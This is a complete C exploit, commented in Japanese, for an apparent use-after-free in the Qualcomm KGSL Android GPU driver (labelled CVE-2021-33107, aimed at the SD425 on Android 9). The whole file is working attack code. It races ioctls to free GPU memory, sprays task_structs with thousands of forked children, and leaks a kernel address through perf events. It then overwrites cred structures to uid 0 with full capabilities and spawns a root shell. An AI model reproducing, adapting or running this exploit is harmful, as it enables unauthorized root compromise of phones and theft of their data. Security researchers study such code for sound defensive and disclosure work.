/*
 * CVE-2021-33107 (CVE-33107) kgsl UAF exploit
 * 専用版: A3xx (SD425) + Android 9 対応
 * - CPU から UAF 領域を直接スキャン/書き換え (GPU コマンド非依存)
 * - 動的アドレス割り当て (MAP_FIXED 最小化)
 * Compile: clang -target armv7a-none-linux-androideabi28 -O2 -fPIE -pie -pthread -o exploit exploit.c
 * (または aarch64 でも可)
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sched.h>
#include <sys/prctl.h>
#include <signal.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <poll.h>
#include <sys/stat.h>

/* ---------- KGSL ioctl definitions (共通) ---------- */
#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc {
    uint64_t size;
    uint64_t flags;
    uint64_t va_len;
    uint64_t mmapsize;
    unsigned int id;
    unsigned int metadata_len;
    uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

struct kgsl_gpuobj_free {
    uint64_t flags;
    uint64_t priv;
    unsigned int id;
    unsigned int type;
    unsigned int len;
    unsigned int __pad;
};
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

struct kgsl_gpuobj_import {
    uint64_t priv;
    uint64_t priv_len;
    uint64_t flags;
    unsigned int type;
    unsigned int id;
};
#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)

struct kgsl_gpuobj_import_useraddr {
    uint64_t virtaddr;
};

/* flags */
#define KGSL_MEMFLAGS_USE_CPU_MAP      (1ULL << 28)
#define KGSL_CACHEMODE_SHIFT           26
#define KGSL_CACHEMODE_MASK            (0x0C000000ULL)
#define KGSL_CACHEMODE_UNCACHED        0
#define KGSL_CACHEMODE_WRITECOMBINE    1
#define KGSL_CACHEMODE_WRITETHROUGH    2
#define KGSL_CACHEMODE_WRITEBACK       3
#define KGSL_USER_MEM_TYPE_ADDR        2

/* ---------- エクスプロイトパラメータ ---------- */
#define UAF_SIZE        (16 * 1024 * 1024 + 16 * 1024)  // 16MB+16KB
#define OVERLAP_SIZE    0x7000
#define PLACEHOLDER_SIZE (16 * 1024 * 1024 + 256 * 1024) // 16MB+256KB
#define BOGUS_SIZE      0xffffffffffefd000ULL
#define SPRAY_PIDS      3000
#define SCAN_WORDS      (UAF_SIZE / 4)

/* task_struct offsets (Linux 4.14 / 4.9) */
#define COMM_OFF        0x818
#define CRED_OFF        0x740
#define REAL_CRED_OFF   0x738

static int kgsl_fd = -1;
static volatile int race_done = 0;

/* ---------- ヘルパー ---------- */
static void die(const char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

/* ---------- KASLR 検出 (失敗しても続行) ---------- */
static uint64_t detect_kaslr(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0;
    pe.exclude_hv = 1;
    pe.exclude_user = 1;

    int fd = syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
    if (fd < 0) {
        printf("[-] perf_event_open 失敗 (errno=%d) - KASLR はスキップ\n", errno);
        return 0;
    }

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;
    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_kernel_ip = 0;
    int n_ips = 0;
    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            n_ips++;
            uint64_t ip = *(uint64_t *)(hdr + 1);
            if (first_kernel_ip == 0) first_kernel_ip = ip;
            if (n_ips <= 3) printf("    IP[%d]=0x%lX\n", n_ips, (unsigned long)ip);
        }
        tail += hdr->size;
    }
    munmap(buf, mmap_size);
    close(fd);
    if (n_ips == 0) return 0;
    // シンボルは使わないので kaslr オフセットだけ戻す
    return (first_kernel_ip & ~0x1FFFFFULL);
}

/* ---------- KGSL ラッパー ---------- */
static int gpuobj_alloc(uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0)
        die("gpuobj_alloc");
    return a.id;
}

static void *gpuobj_mmap(size_t size, unsigned int id, void *hint) {
    // MAP_FIXED は使わない（カーネルに任せる）
    void *p = mmap(hint, size, PROT_READ | PROT_WRITE, MAP_SHARED,
                   kgsl_fd, (off_t)id << 12);
    if (p == MAP_FAILED) {
        // ヒントがダメならゼロから試す
        p = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED,
                 kgsl_fd, (off_t)id << 12);
    }
    return p;
}

static void gpuobj_free(unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0)
        die("gpuobj_free");
}

/* ---------- レーススレッド ---------- */
static void *race_thread(void *arg) {
    uint64_t bogus_addr = *(uint64_t *)arg;
    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = bogus_addr };
    struct kgsl_gpuobj_import imp = {
        .priv = (uint64_t)&uaddr,
        .priv_len = BOGUS_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
        .type = KGSL_USER_MEM_TYPE_ADDR,
    };
    while (!race_done)
        ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
    return NULL;
}

/* ---------- main ---------- */
int main(int argc, char **argv) {
    setbuf(stdout, NULL);

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open /dev/kgsl-3d0");
    printf("[+] kgsl fd = %d\n", kgsl_fd);

    /* ---- Phase 0: KASLR (失敗しても続行) ---- */
    printf("[*] Phase 0: KASLR detection (skip if fail)\n");
    detect_kaslr();

    /* ---- Phase 1: UAF バッファ確保 (動的アドレス) ---- */
    printf("[*] Phase 1: Allocate UAF buffer (dynamic)\n");
    uint64_t flags = KGSL_MEMFLAGS_USE_CPU_MAP |
                     ((uint64_t)KGSL_CACHEMODE_WRITEBACK << KGSL_CACHEMODE_SHIFT);

    int uaf_id = gpuobj_alloc(UAF_SIZE, flags);
    void *uaf_m = gpuobj_mmap(UAF_SIZE, uaf_id, NULL);
    if (uaf_m == MAP_FAILED) die("uaf mmap");
    uint64_t uaf_base = (uint64_t)uaf_m;
    printf("[+] UAF mapped at 0x%lx\n", (unsigned long)uaf_base);

    // プレースホルダ (物理ページの確保を促進)
    int ph_id = gpuobj_alloc(PLACEHOLDER_SIZE, flags);
    void *ph_m = gpuobj_mmap(PLACEHOLDER_SIZE, ph_id, NULL);
    if (ph_m == MAP_FAILED) die("placeholder mmap");
    printf("[+] Placeholder at 0x%lx\n", (unsigned long)ph_m);

    // オーバーラップ / ボーガスアドレス (UAF の直後 or 適当な空き領域)
    uint64_t overlap_addr = uaf_base + UAF_SIZE + 0x1000;
    uint64_t bogus_addr = uaf_base + UAF_SIZE + 0x2000;
    // ボーガス用の匿名マップを確保 (競合防止)
    if (mmap((void *)bogus_addr, 0x1000, PROT_READ | PROT_WRITE,
             MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0) == MAP_FAILED) {
        bogus_addr = uaf_base + UAF_SIZE + 0x3000; // 再挑戦
        mmap((void *)bogus_addr, 0x1000, PROT_READ | PROT_WRITE,
             MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    }

    printf("  overlap=0x%lx bogus=0x%lx\n", (unsigned long)overlap_addr,
           (unsigned long)bogus_addr);

    /* ---- Phase 2: Race (UAF トリガー) ---- */
    printf("[*] Phase 2: Trigger UAF race\n");
    int ov_id = gpuobj_alloc(OVERLAP_SIZE, flags);

    pthread_t thr;
    if (pthread_create(&thr, NULL, race_thread, &bogus_addr) != 0)
        die("pthread");

    int hit = 0;
    for (int i = 0; i < 5000000; i++) {
        void *r = mmap((void *)overlap_addr, OVERLAP_SIZE,
                       PROT_READ | PROT_WRITE,
                       MAP_SHARED | MAP_FIXED, kgsl_fd, (off_t)ov_id << 12);
        int e = errno;
        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
        if (e == ENODEV) { hit = 1; break; }
        if (i % 500000 == 0) printf("  race %d/%d errno=%d\n", i, 5000000, e);
    }
    race_done = 1;
    pthread_join(thr, NULL);

    if (!hit) { printf("[-] Race failed\n"); goto cleanup; }
    printf("[+] Race won (errno=ENODEV)\n");

    /* ---- Phase 3: UAF 解放 (物理ページが空く) ---- */
    printf("[*] Phase 3: Free UAF object\n");
    gpuobj_free(uaf_id);
    printf("[+] UAF freed, physical pages released\n");

    /* ---- Phase 4: ページ回収 & スプレー ---- */
    printf("[*] Phase 4: Reclaim pages & fork spray\n");
    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
    if (rf >= 0) { write(rf, "1", 1); close(rf); }
    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (rf >= 0) { write(rf, "3", 1); close(rf); }
    usleep(10000);

    int notify_pipe[2];
    if (pipe(notify_pipe) < 0) die("pipe");
    fcntl(notify_pipe[0], F_SETFD, FD_CLOEXEC);
    fcntl(notify_pipe[1], F_SETFD, FD_CLOEXEC);

    printf("[*] Spawning %d children (task_struct spray)\n", SPRAY_PIDS);
    pid_t spray_pids[SPRAY_PIDS];
    int n_spray = 0;
    for (int i = 0; i < SPRAY_PIDS; i++) {
        pid_t p = fork();
        if (p == 0) {
            close(notify_pipe[0]);
            prctl(PR_SET_NAME, "TASKUAF!!");
            // 子プロセスは uid=0 になるのを監視
            for (int j = 0; j < 1800; j++) {
                usleep(200000);
                if (getuid() == 0) {
                    usleep(50000);
                    pid_t me = getpid();
                    write(notify_pipe[1], &me, sizeof(me));
                    // シェル起動
                    execl("/system/bin/sh", "sh", NULL);
                    write(1, "sh exec failed\n", 15);
                    _exit(0);
                }
            }
            close(notify_pipe[1]);
            _exit(0);
        }
        if (p > 0) spray_pids[n_spray++] = p;
        else break;
    }
    close(notify_pipe[1]);
    printf("  Spawned %d children\n", n_spray);

    /* ---- Phase 5: CPU で UAF 領域をスキャン (cred 構造体を探す) ---- */
    printf("[*] Phase 5: CPU scan UAF range for cred structs\n");
    uint32_t *scan = (uint32_t *)uaf_base;
    int found = 0;
    int total_words = UAF_SIZE / 4;

    for (int i = 0; i < total_words - 32; i += 1) {
        // cred 構造体の特徴:
        // offset+4: uid, offset+8: gid, offset+20: euid, offset+24: egid
        // uid == gid == euid == egid かつ 1000 < uid < 20000
        uint32_t uid = scan[i + 1];
        uint32_t gid = scan[i + 2];
        uint32_t euid = scan[i + 5];
        uint32_t egid = scan[i + 6];
        if (uid == gid && uid == euid && uid == egid && uid > 1000 && uid < 20000) {
            // securebits (offset+9) は 0 または 4
            if (scan[i + 9] == 0 || scan[i + 9] == 4) {
                // cap_inheritable (offset+10,11) は 0
                if (scan[i + 10] == 0 && scan[i + 11] == 0) {
                    printf("[+] Found cred at offset 0x%lx (uid=%u)\n",
                           (unsigned long)(i * 4), uid);
                    // uid/gid/euid/egid を 0 に
                    scan[i + 1] = 0; // uid
                    scan[i + 2] = 0; // gid
                    scan[i + 3] = 0; // suid
                    scan[i + 4] = 0; // sgid
                    scan[i + 5] = 0; // euid
                    scan[i + 6] = 0; // egid
                    scan[i + 7] = 0; // fsuid
                    scan[i + 8] = 0; // fsgid
                    // cap をフルに
                    scan[i + 12] = 0xFFFFFFFF; scan[i + 13] = 0x0000003F; // permitted
                    scan[i + 14] = 0xFFFFFFFF; scan[i + 15] = 0x0000003F; // effective
                    scan[i + 16] = 0xFFFFFFFF; scan[i + 17] = 0x0000003F; // bset
                    // security ポインタは弄らない (元の値を保持)
                    found = 1;
                    break;
                }
            }
        }
    }

    if (!found) {
        printf("[-] No cred found in UAF range\n");
    } else {
        printf("[+] cred overwritten (uid=0, caps=full)\n");
        // キャッシュをフラッシュ (CPU 書き込みが物理メモリに到達するように)
        __sync_synchronize();
        // 念の為 dc civac (可能なら)
        asm volatile("dsb sy" : : : "memory");
    }

    /* ---- Phase 6: 子プロセスの root 通知を待つ ---- */
    printf("[*] Phase 6: Waiting for root shell...\n");
    struct pollfd pfd = { .fd = notify_pipe[0], .events = POLLIN };
    pid_t winner = 0;
    if (poll(&pfd, 1, 15000) > 0 &&
        read(notify_pipe[0], &winner, sizeof(winner)) == sizeof(winner)) {
        printf("[+] ROOT! PID=%d\n", winner);
        for (int i = 0; i < n_spray; i++)
            if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
        waitpid(winner, NULL, 0);
    } else {
        printf("[-] No child reported root\n");
    }

cleanup:
    close(kgsl_fd);
    for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
    while (wait(NULL) > 0);
    printf("[*] Done.\n");
    return 0;
}
